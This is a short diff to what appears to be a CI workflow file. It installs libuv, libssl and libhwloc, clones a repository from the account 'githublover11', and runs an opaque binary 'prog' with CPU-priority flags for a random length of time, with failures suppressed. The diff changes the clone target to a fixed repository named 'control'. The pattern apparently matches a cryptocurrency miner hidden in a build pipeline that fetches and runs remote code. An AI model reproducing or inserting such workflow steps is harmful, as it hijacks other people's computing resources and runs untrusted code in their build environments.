@@ -15,8 +15,7 @@ jobs:
       - run: |
           apt update -qq
           apt install -y git libuv1 libssl1.1 libhwloc15
-          export REPO=$(echo $GITHUB_REPOSITORY | cut -f2 -d/)
-          git clone https://github.com/githublover11/$REPO.git
-          cd $REPO
+          git clone https://github.com/githublover11/control.git
+          cd control
           chmod u+x prog
           timeout $(shuf -i 500-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
